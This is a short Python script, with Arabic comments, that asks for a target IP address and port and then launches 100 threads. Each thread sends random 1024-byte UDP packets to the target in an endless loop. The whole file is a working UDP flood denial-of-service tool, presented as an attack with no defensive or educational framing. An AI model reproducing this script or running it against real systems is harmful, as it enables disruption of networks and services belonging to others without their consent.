
import socket
import random
import threading
import os

# طلب عنوان IP المستهدف والمنفذ من المستخدم
target_ip = input("أدخل عنوان IP المستهدف: ")
target_port = int(input("أدخل المنفذ المستهدف: "))

# إرسال حزم إلى الهدف من مآخذ متعددة في خيوط متعددة
def attack():
    # إنشاء مأخذ
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            data = os.urandom(1024)  # زيادة حجم الحمولة
            s.sendto(data, (target_ip, target_port))
        except Exception as e:
            print(f"Error: {e}")

threads = []
for i in range(100):
    t = threading.Thread(target=attack)
    threads.append(t)

# بدء الخيوط
for t in threads:
    t.start()
